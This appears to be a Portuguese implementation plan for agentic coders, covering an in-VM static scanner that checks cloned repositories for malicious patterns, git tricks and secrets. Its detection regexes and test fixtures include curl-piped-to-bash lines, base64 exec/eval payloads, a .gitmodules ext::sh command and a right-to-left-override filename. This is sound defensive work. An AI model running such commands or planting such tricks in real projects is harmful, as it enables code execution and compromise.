# Repo Safety Check — Fase 3: Scanners Estáticos dentro da VM Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Entregar um script Python standalone que roda dentro da VM efêmera (Fase 2), clona o repositório-alvo, e roda três scanners estáticos (padrões maliciosos, checagens específicas de git, secrets) sem nunca executar nada do repositório, produzindo um relatório JSON estruturado — mais a orquestração no host que aciona tudo isso via `EphemeralVM`.

**Architecture:** Um script auto-contido (`repocheck/vm_scripts/analyze.py`, só stdlib + `detect-secrets` via CLI) é empurrado para dentro da VM e executado ali; ele nunca é importado pelo pacote `repocheck` instalado no host — é testado no host carregando o arquivo diretamente via `importlib`, usando repositórios git temporários reais como fixture (sem precisar de VM para testar a lógica dos scanners). A orquestração do lado do host (`repocheck/src/repocheck/analysis.py`) usa a classe `EphemeralVM` da Fase 2 para: instalar `git`/`detect-secrets` na VM, clonar o repo, empurrar o script, rodá-lo, e puxar o JSON de volta — nunca puxando o código-fonte do repositório em si.

**Tech Stack:** Python >= 3.11 stdlib (script da VM), `detect-secrets` (scanner de secrets, instalado via pip tanto no host para testes quanto dentro da VM em produção), pytest (testes no host).

## Global Constraints

- O script que roda dentro da VM nunca executa nada do repositório clonado — só lê conteúdo de arquivo (scanners puramente estáticos).
- Cada achado (finding) tem `rule`, `file`, `line`, `snippet` — exceto achados de secrets, cujo `snippet` fica sempre vazio (nunca persiste o valor real do segredo encontrado).
- Se um scanner externo (`detect-secrets`) não estiver disponível/falhar, o achado correspondente é marcado com `rule: "scanner_not_executed"` — nunca retorna lista vazia silenciosamente insinuando "limpo".
- O único artefato que sai da VM é o JSON de achados — nunca o código-fonte do repositório clonado.
- A VM é sempre criada nova e destruída ao final (herdado do `EphemeralVM` da Fase 2 — este módulo não reimplementa esse ciclo de vida, só o consome).
- O script da VM (`repocheck/vm_scripts/analyze.py`) não importa nada do pacote `repocheck` instalado — é um arquivo auto-contido, testável no host via `importlib` sem precisar estar "instalado".

---

## Task 1: Scanner de padrões maliciosos

**Files:**
- Create: `repocheck/vm_scripts/analyze.py`
- Test: `repocheck/tests/test_analyze_script.py`

**Interfaces:**
- Consumes: nada de fases anteriores.
- Produces: `analyze.MALICIOUS_PATTERNS` (`list[tuple[str, re.Pattern]]`), `analyze.scan_malicious_patterns(repo_path: pathlib.Path) -> list[dict]` (cada dict com chaves `rule: str`, `file: str`, `line: int`, `snippet: str`).

- [ ] **Step 1: Escrever o teste do scanner de padrões maliciosos (deve falhar)**

Criar `repocheck/tests/test_analyze_script.py`:

```python
import importlib.util
import subprocess
from pathlib import Path

_SCRIPT_PATH = Path(__file__).resolve().parent.parent / "vm_scripts" / "analyze.py"


def _load_analyze_module():
    spec = importlib.util.spec_from_file_location("analyze", _SCRIPT_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze = _load_analyze_module()


def _init_repo(tmp_path: Path) -> Path:
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_dir, check=True)
    return repo_dir


def test_scan_malicious_patterns_finds_curl_pipe_bash(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text(
        "#!/bin/sh\ncurl https://example.com/payload.sh | bash\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "curl_pipe_shell"
    assert findings[0]["file"] == "install.sh"
    assert findings[0]["line"] == 2
    assert "curl" in findings[0]["snippet"]


def test_scan_malicious_patterns_finds_js_eval_decoded(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "postinstall.js").write_text(
        "eval(Buffer.from('c29tZSBjb2Rl', 'base64').toString());\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "js_eval_decoded"
    assert findings[0]["file"] == "postinstall.js"


def test_scan_malicious_patterns_finds_python_exec_base64(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text(
        "import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "python_exec_base64"


def test_scan_malicious_patterns_ignores_clean_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "main.py").write_text("print('hello world')\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_binary_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "payload.bin").write_bytes(
        b"curl https://example.com/x | bash\x00\x01\x02"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    fake_hook_dir = repo_dir / ".git" / "hooks"
    fake_hook_dir.mkdir(parents=True, exist_ok=True)
    (fake_hook_dir / "fake-hook").write_text("curl https://example.com/x | bash\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: FAIL — o arquivo `repocheck/vm_scripts/analyze.py` ainda não existe (`FileNotFoundError`/erro ao carregar o spec).

- [ ] **Step 3: Implementar `scan_malicious_patterns`**

Criar `repocheck/vm_scripts/analyze.py`:

```python
import re
from pathlib import Path

MALICIOUS_PATTERNS = [
    ("curl_pipe_shell", re.compile(r"curl\s+[^\n|]*\|\s*(sudo\s+)?(sh|bash)\b")),
    ("wget_pipe_shell", re.compile(r"wget\s+[^\n|]*\|\s*(sudo\s+)?(sh|bash)\b")),
    ("js_eval_decoded", re.compile(r"eval\s*\(\s*(atob|Buffer\.from)\s*\(")),
    (
        "powershell_encoded_command",
        re.compile(r"powershell(\.exe)?\s+.*-[Ee]nc(odedCommand)?\b"),
    ),
    ("python_exec_base64", re.compile(r"exec\s*\(\s*base64\.b64decode")),
]

_MAX_FILE_SIZE_BYTES = 1_000_000


def _is_probably_binary(data: bytes) -> bool:
    return b"\x00" in data


def scan_malicious_patterns(repo_path: Path) -> list[dict]:
    findings = []
    for file_path in sorted(repo_path.rglob("*")):
        if not file_path.is_file():
            continue
        relative_path = file_path.relative_to(repo_path)
        if ".git" in relative_path.parts:
            continue
        try:
            if file_path.stat().st_size > _MAX_FILE_SIZE_BYTES:
                continue
            raw = file_path.read_bytes()
        except OSError:
            continue
        if _is_probably_binary(raw):
            continue
        text = raw.decode("utf-8", errors="ignore")
        for line_number, line in enumerate(text.splitlines(), start=1):
            for rule_name, pattern in MALICIOUS_PATTERNS:
                if pattern.search(line):
                    findings.append(
                        {
                            "rule": rule_name,
                            "file": str(relative_path),
                            "line": line_number,
                            "snippet": line.strip()[:200],
                        }
                    )
    return findings
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: 6 passed.

- [ ] **Step 5: Commit**

```bash
git add repocheck/vm_scripts/analyze.py repocheck/tests/test_analyze_script.py
git commit -m "feat(repocheck): add malicious pattern scanner for the in-VM analysis script"
```

---

## Task 2: Checagens específicas de git

**Files:**
- Modify: `repocheck/vm_scripts/analyze.py`
- Test: `repocheck/tests/test_analyze_script.py`

**Interfaces:**
- Consumes: nada de tasks anteriores (função independente).
- Produces: `analyze.scan_git_specifics(repo_path: pathlib.Path) -> list[dict]` (mesmo schema: `rule`, `file`, `line`, `snippet`).

- [ ] **Step 1: Escrever os testes de checagens git (devem falhar)**

Adicionar ao final de `repocheck/tests/test_analyze_script.py`:

```python
def test_scan_git_specifics_finds_gitmodules_ext_transport(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitmodules").write_text(
        '[submodule "evil"]\n'
        "\tpath = evil\n"
        "\turl = ext::sh -c 'touch /tmp/pwned'\n"
    )

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitmodules_ext_transport" in rules


def test_scan_git_specifics_finds_gitattributes_custom_filter(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitattributes").write_text("*.secret filter=my-custom-filter\n")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitattributes_custom_filter" in rules


def test_scan_git_specifics_finds_nested_git_path(tmp_path):
    repo_dir = _init_repo(tmp_path)
    nested = repo_dir / "vendor" / ".git"
    nested.mkdir(parents=True)

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "nested_git_path" in rules
    nested_finding = next(f for f in findings if f["rule"] == "nested_git_path")
    assert nested_finding["file"] == "vendor/.git"


def test_scan_git_specifics_finds_suspicious_filename_characters(tmp_path):
    repo_dir = _init_repo(tmp_path)
    suspicious_name = "invoice‮gpj.exe"
    (repo_dir / suspicious_name).write_text("not actually an image")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "suspicious_filename_characters" in rules


def test_scan_git_specifics_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_git_specifics(repo_dir)

    assert findings == []
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: FAIL com `AttributeError: module 'analyze' has no attribute 'scan_git_specifics'`.

- [ ] **Step 3: Implementar `scan_git_specifics`**

Adicionar `import unicodedata` aos imports no topo de `repocheck/vm_scripts/analyze.py`, e a função ao final do arquivo:

```python
def scan_git_specifics(repo_path: Path) -> list[dict]:
    findings = []

    gitmodules = repo_path / ".gitmodules"
    if gitmodules.is_file():
        for line_number, line in enumerate(
            gitmodules.read_text(errors="ignore").splitlines(), start=1
        ):
            if "ext::" in line:
                findings.append(
                    {
                        "rule": "gitmodules_ext_transport",
                        "file": ".gitmodules",
                        "line": line_number,
                        "snippet": line.strip()[:200],
                    }
                )

    gitattributes = repo_path / ".gitattributes"
    if gitattributes.is_file():
        for line_number, line in enumerate(
            gitattributes.read_text(errors="ignore").splitlines(), start=1
        ):
            if "filter=" in line:
                findings.append(
                    {
                        "rule": "gitattributes_custom_filter",
                        "file": ".gitattributes",
                        "line": line_number,
                        "snippet": line.strip()[:200],
                    }
                )

    root_git_path = repo_path / ".git"
    for path in sorted(repo_path.rglob(".git")):
        if path == root_git_path:
            continue
        findings.append(
            {
                "rule": "nested_git_path",
                "file": str(path.relative_to(repo_path)),
                "line": 0,
                "snippet": "",
            }
        )

    for path in sorted(repo_path.rglob("*")):
        relative_path = path.relative_to(repo_path)
        if ".git" in relative_path.parts:
            continue
        if any(unicodedata.category(ch) == "Cf" for ch in path.name):
            findings.append(
                {
                    "rule": "suspicious_filename_characters",
                    "file": str(relative_path),
                    "line": 0,
                    "snippet": "",
                }
            )

    return findings
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: 11 passed.

- [ ] **Step 5: Commit**

```bash
git add repocheck/vm_scripts/analyze.py repocheck/tests/test_analyze_script.py
git commit -m "feat(repocheck): add git-specific checks scanner for the in-VM analysis script"
```

---

## Task 3: Scanner de secrets (wrapper do `detect-secrets`)

**Files:**
- Modify: `repocheck/vm_scripts/analyze.py`
- Modify: `repocheck/pyproject.toml`
- Test: `repocheck/tests/test_analyze_script.py`

**Interfaces:**
- Consumes: nada de tasks anteriores (função independente).
- Produces: `analyze.scan_secrets(repo_path: pathlib.Path) -> list[dict]` (mesmo schema `rule`/`file`/`line`/`snippet`, mas `snippet` sempre `""` para achados de secret).

- [ ] **Step 1: Adicionar `detect-secrets` como dependência de dev**

Editar `repocheck/pyproject.toml`, no bloco `[project.optional-dependencies]`, adicionando `detect-secrets` à lista `dev`:

```toml
[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "responses>=0.25",
    "detect-secrets>=1.5",
]
```

Instalar:

```bash
cd repocheck && .venv/bin/pip install -e ".[dev]"
```

- [ ] **Step 2: Escrever os testes do scanner de secrets (devem falhar)**

Adicionar ao final de `repocheck/tests/test_analyze_script.py`:

```python
from unittest.mock import patch


def test_scan_secrets_finds_aws_key(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "config.py").write_text(
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"].startswith("secret_")
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 1
    assert findings[0]["snippet"] == ""


def test_scan_secrets_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_secrets(repo_dir)

    assert findings == []


def test_scan_secrets_marks_not_executed_when_tool_missing(tmp_path):
    repo_dir = _init_repo(tmp_path)

    with patch.object(
        analyze.subprocess, "run", side_effect=FileNotFoundError("no such file")
    ):
        findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "scanner_not_executed"
```

Nota: `analyze` foi carregado dinamicamente via `importlib` (não está registrado em `sys.modules` sob o nome `"analyze"`), então `patch("analyze.subprocess.run", ...)` baseado em string falharia com `ModuleNotFoundError`. Use sempre `patch.object(analyze.subprocess, "run", ...)`, que opera na referência real do objeto já carregado, não em um caminho de import.

- [ ] **Step 3: Rodar os testes e confirmar que falham**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: FAIL com `AttributeError: module 'analyze' has no attribute 'scan_secrets'`.

- [ ] **Step 4: Implementar `scan_secrets`**

Adicionar `import json` e `import subprocess` aos imports no topo de `repocheck/vm_scripts/analyze.py`, e a função ao final do arquivo:

```python
def scan_secrets(repo_path: Path) -> list[dict]:
    try:
        result = subprocess.run(
            ["detect-secrets", "scan", str(repo_path)],
            capture_output=True,
            text=True,
            timeout=120,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
        return [
            {
                "rule": "scanner_not_executed",
                "file": "",
                "line": 0,
                "snippet": f"detect-secrets unavailable: {exc}",
            }
        ]

    if result.returncode != 0:
        return [
            {
                "rule": "scanner_not_executed",
                "file": "",
                "line": 0,
                "snippet": f"detect-secrets failed: {result.stderr.strip()}",
            }
        ]

    payload = json.loads(result.stdout)
    findings = []
    for file_path, file_findings in payload.get("results", {}).items():
        for finding in file_findings:
            findings.append(
                {
                    "rule": f"secret_{finding['type'].lower().replace(' ', '_')}",
                    "file": file_path,
                    "line": finding["line_number"],
                    "snippet": "",
                }
            )
    return findings
```

- [ ] **Step 5: Rodar os testes e confirmar que passam**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: 14 passed.

- [ ] **Step 6: Commit**

```bash
git add repocheck/vm_scripts/analyze.py repocheck/tests/test_analyze_script.py repocheck/pyproject.toml
git commit -m "feat(repocheck): add secrets scanner wrapping detect-secrets"
```

---

## Task 4: Ponto de entrada (`run`/`main`) e relatório JSON combinado

**Files:**
- Modify: `repocheck/vm_scripts/analyze.py`
- Test: `repocheck/tests/test_analyze_script.py`

**Interfaces:**
- Consumes: `analyze.scan_malicious_patterns`, `analyze.scan_git_specifics`, `analyze.scan_secrets` (Tasks 1-3, já em `analyze.py`).
- Produces: `analyze.run(repo_path: pathlib.Path, output_path: pathlib.Path) -> None` (escreve JSON com chaves `malicious_patterns`, `git_findings`, `secrets`), `analyze.main() -> None` (lê `sys.argv[1]`/`sys.argv[2]` e chama `run`).

- [ ] **Step 1: Escrever o teste do ponto de entrada (deve falhar)**

Adicionar ao final de `repocheck/tests/test_analyze_script.py`:

```python
import json as json_module


def test_run_writes_combined_json_report(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text("curl https://example.com/x | bash\n")
    output_path = tmp_path / "report.json"

    analyze.run(repo_dir, output_path)

    payload = json_module.loads(output_path.read_text())
    assert set(payload.keys()) == {"malicious_patterns", "git_findings", "secrets"}
    assert len(payload["malicious_patterns"]) == 1
    assert payload["malicious_patterns"][0]["rule"] == "curl_pipe_shell"
    assert payload["git_findings"] == []
```

- [ ] **Step 2: Rodar o teste e confirmar que falha**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: FAIL com `AttributeError: module 'analyze' has no attribute 'run'`.

- [ ] **Step 3: Implementar `run` e `main`**

Adicionar `import sys` aos imports no topo de `repocheck/vm_scripts/analyze.py`, e ao final do arquivo:

```python
def run(repo_path: Path, output_path: Path) -> None:
    report = {
        "malicious_patterns": scan_malicious_patterns(repo_path),
        "git_findings": scan_git_specifics(repo_path),
        "secrets": scan_secrets(repo_path),
    }
    output_path.write_text(json.dumps(report, indent=2))


def main() -> None:
    run(Path(sys.argv[1]), Path(sys.argv[2]))


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

```bash
cd repocheck && .venv/bin/pytest tests/test_analyze_script.py -v
```

Expected: 15 passed.

- [ ] **Step 5: Commit**

```bash
git add repocheck/vm_scripts/analyze.py repocheck/tests/test_analyze_script.py
git commit -m "feat(repocheck): add run()/main() entry point writing the combined JSON report"
```

---

## Task 5: Orquestração no host (`run_static_analysis`)

**Files:**
- Create: `repocheck/src/repocheck/analysis.py`
- Test: `repocheck/tests/test_analysis.py`

**Interfaces:**
- Consumes: `repocheck.vm.EphemeralVM` (Fase 2).
- Produces: `repocheck.analysis.StaticAnalysisReport` (dataclass: `clone_succeeded: bool`, `malicious_patterns: list[dict]`, `git_findings: list[dict]`, `secrets: list[dict]`, `error: str | None`), `repocheck.analysis.run_static_analysis(url: str, timeout: float = 300.0) -> StaticAnalysisReport`.

- [ ] **Step 1: Escrever os testes de orquestração (devem falhar)**

Criar `repocheck/tests/test_analysis.py`:

```python
import json
from pathlib import Path
from unittest.mock import MagicMock, patch


def _make_mock_vm(bootstrap_rc=0, clone_rc=0, analyze_rc=0, report_payload=None):
    vm = MagicMock()
    vm.__enter__.return_value = vm
    vm.__exit__.return_value = False

    def run_side_effect(command, timeout=None):
        result = MagicMock()
        if command[:2] == ["bash", "-c"]:
            result.returncode = bootstrap_rc
            result.stderr = "" if bootstrap_rc == 0 else "bootstrap error"
        elif command[:2] == ["git", "clone"]:
            result.returncode = clone_rc
            result.stderr = "" if clone_rc == 0 else "clone error"
        else:
            result.returncode = analyze_rc
            result.stderr = "" if analyze_rc == 0 else "analyze error"
        return result

    vm.run.side_effect = run_side_effect

    payload = (
        report_payload
        if report_payload is not None
        else {"malicious_patterns": [], "git_findings": [], "secrets": []}
    )

    def pull_file_side_effect(remote_path, local_path):
        Path(local_path).write_text(json.dumps(payload))

    vm.pull_file.side_effect = pull_file_side_effect
    return vm


def test_run_static_analysis_happy_path():
    from repocheck.analysis import run_static_analysis

    mock_vm = _make_mock_vm(
        report_payload={
            "malicious_patterns": [
                {
                    "rule": "curl_pipe_shell",
                    "file": "install.sh",
                    "line": 3,
                    "snippet": "curl x | bash",
                }
            ],
            "git_findings": [],
            "secrets": [],
        }
    )
    with patch("repocheck.analysis.EphemeralVM", return_value=mock_vm):
        report = run_static_analysis("https://github.com/example/repo")

    assert report.clone_succeeded is True
    assert report.error is None
    assert len(report.malicious_patterns) == 1
    assert report.malicious_patterns[0]["rule"] == "curl_pipe_shell"
    mock_vm.push_file.assert_called_once()
    mock_vm.pull_file.assert_called_once()


def test_run_static_analysis_bootstrap_failure():
    from repocheck.analysis import run_static_analysis

    mock_vm = _make_mock_vm(bootstrap_rc=1)
    with patch("repocheck.analysis.EphemeralVM", return_value=mock_vm):
        report = run_static_analysis("https://github.com/example/repo")

    assert report.clone_succeeded is False
    assert "bootstrap failed" in report.error
    mock_vm.push_file.assert_not_called()


def test_run_static_analysis_clone_failure():
    from repocheck.analysis import run_static_analysis

    mock_vm = _make_mock_vm(clone_rc=128)
    with patch("repocheck.analysis.EphemeralVM", return_value=mock_vm):
        report = run_static_analysis("https://github.com/example/nonexistent")

    assert report.clone_succeeded is False
    assert "clone failed" in report.error


def test_run_static_analysis_script_failure():
    from repocheck.analysis import run_static_analysis

    mock_vm = _make_mock_vm(analyze_rc=1)
    with patch("repocheck.analysis.EphemeralVM", return_value=mock_vm):
        report = run_static_analysis("https://github.com/example/repo")

    assert report.clone_succeeded is True
    assert "analysis script failed" in report.error
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

```bash
cd repocheck && .venv/bin/pytest tests/test_analysis.py -v
```

Expected: FAIL com `ModuleNotFoundError: No module named 'repocheck.analysis'`.

- [ ] **Step 3: Implementar `run_static_analysis`**

Criar `repocheck/src/repocheck/analysis.py`:

```python
import json
import tempfile
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from repocheck.vm import EphemeralVM

_VM_SCRIPTS_DIR = Path(__file__).resolve().parent.parent.parent / "vm_scripts"
_ANALYZE_SCRIPT = _VM_SCRIPTS_DIR / "analyze.py"

_REMOTE_REPO_PATH = "/home/ubuntu/repo"
_REMOTE_SCRIPT_PATH = "/home/ubuntu/analyze.py"
_REMOTE_REPORT_PATH = "/home/ubuntu/report.json"

_BOOTSTRAP_COMMAND = [
    "bash",
    "-c",
    "sudo apt-get update -qq && "
    "sudo apt-get install -y -qq git python3-pip && "
    "pip3 install --quiet detect-secrets",
]


@dataclass
class StaticAnalysisReport:
    clone_succeeded: bool
    malicious_patterns: list[dict[str, Any]] = field(default_factory=list)
    git_findings: list[dict[str, Any]] = field(default_factory=list)
    secrets: list[dict[str, Any]] = field(default_factory=list)
    error: str | None = None


def _local_temp_report_path() -> Path:
    return Path(tempfile.gettempdir()) / f"repocheck-report-{uuid.uuid4().hex}.json"


def run_static_analysis(url: str, timeout: float = 300.0) -> StaticAnalysisReport:
    with EphemeralVM(launch_timeout=180.0) as vm:
        bootstrap_result = vm.run(_BOOTSTRAP_COMMAND, timeout=180.0)
        if bootstrap_result.returncode != 0:
            return StaticAnalysisReport(
                clone_succeeded=False,
                error=f"bootstrap failed: {bootstrap_result.stderr.strip()}",
            )

        clone_result = vm.run(
            ["git", "clone", "--", url, _REMOTE_REPO_PATH], timeout=timeout
        )
        if clone_result.returncode != 0:
            return StaticAnalysisReport(
                clone_succeeded=False,
                error=f"clone failed: {clone_result.stderr.strip()}",
            )

        vm.push_file(_ANALYZE_SCRIPT, _REMOTE_SCRIPT_PATH)

        analyze_result = vm.run(
            ["python3", _REMOTE_SCRIPT_PATH, _REMOTE_REPO_PATH, _REMOTE_REPORT_PATH],
            timeout=timeout,
        )
        if analyze_result.returncode != 0:
            return StaticAnalysisReport(
                clone_succeeded=True,
                error=f"analysis script failed: {analyze_result.stderr.strip()}",
            )

        local_report_path = _local_temp_report_path()
        vm.pull_file(_REMOTE_REPORT_PATH, local_report_path)
        payload = json.loads(local_report_path.read_text())
        local_report_path.unlink(missing_ok=True)

    return StaticAnalysisReport(
        clone_succeeded=True,
        malicious_patterns=payload.get("malicious_patterns", []),
        git_findings=payload.get("git_findings", []),
        secrets=payload.get("secrets", []),
    )
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

```bash
cd repocheck && .venv/bin/pytest tests/test_analysis.py -v
```

Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
git add repocheck/src/repocheck/analysis.py repocheck/tests/test_analysis.py
git commit -m "feat(repocheck): orchestrate static analysis pipeline via EphemeralVM"
```

---

## Task 6: Teste de integração real (pipeline completo contra um repositório público real)

**Files:**
- Test: `repocheck/tests/test_analysis_integration.py`

**Interfaces:**
- Consumes: `repocheck.analysis.run_static_analysis`, `repocheck.vm.check_multipass_available` (Task 5 e Fase 2, já completas).
- Produces: nada de novo em produção — só um teste de integração pulado quando o Multipass não está disponível.

Este teste usa um repositório público pequeno e estável (`https://github.com/octocat/Hello-World`, o repositório de demonstração oficial do próprio GitHub) só para provar que a tubulação inteira funciona de ponta a ponta contra um Multipass real (bootstrap → clone → push do script → execução → pull do JSON). A precisão dos scanners em si (detectar padrão malicioso/segredo/achado de git) já está coberta pelos testes locais das Tasks 1-3, que usam fixtures controladas — não precisamos reproduzir isso aqui.

- [ ] **Step 1: Escrever o teste de integração**

Criar `repocheck/tests/test_analysis_integration.py`:

```python
import pytest

from repocheck.analysis import run_static_analysis
from repocheck.vm import check_multipass_available

pytestmark = pytest.mark.skipif(
    not check_multipass_available(),
    reason="multipass CLI not installed/available in this environment",
)


def test_static_analysis_full_pipeline_against_real_public_repo():
    report = run_static_analysis(
        "https://github.com/octocat/Hello-World", timeout=300.0
    )

    assert report.clone_succeeded is True
    assert report.error is None
    assert isinstance(report.malicious_patterns, list)
    assert isinstance(report.git_findings, list)
    assert isinstance(report.secrets, list)
```

- [ ] **Step 2: Rodar o teste**

```bash
cd repocheck && .venv/bin/pytest tests/test_analysis_integration.py -v
```

Expected: se o Multipass não estiver instalado, `SKIPPED`. Se estiver, `1 passed` (pode levar de 1 a 3 minutos por causa do bootstrap/download de imagem).

- [ ] **Step 3: Rodar a suíte completa do projeto**

```bash
cd repocheck && .venv/bin/pytest -v
```

Expected: todos os testes das Fases 1, 2 e 3 passam (sem regressões).

- [ ] **Step 4: Commit**

```bash
git add repocheck/tests/test_analysis_integration.py
git commit -m "test(repocheck): add real end-to-end static analysis pipeline integration test"
```

---

## Escopo desta fase — o que fica para depois

- Corte de rede e a etapa dinâmica (build/install de fato, com telemetria de processo/rede) ficam para a Fase 4 — esta fase só faz clone (rede ligada o tempo todo) + análise estática, nunca executa nada do repositório.
- O veredito final (SEGURO/SUSPEITO/MALICIOSO) ainda não existe — isso é a Fase 5, que combina `PrecheckResult` (Fase 1) com `StaticAnalysisReport` (esta fase) e o relatório da etapa dinâmica (Fase 4).
- Scanners adicionais (semgrep, YARA, OSV-Scanner) ficam fora do escopo da v1, conforme o spec original — os três scanners desta fase (padrões maliciosos via regex, checagens de git, secrets via `detect-secrets`) são o conjunto mínimo estabelecido no design.
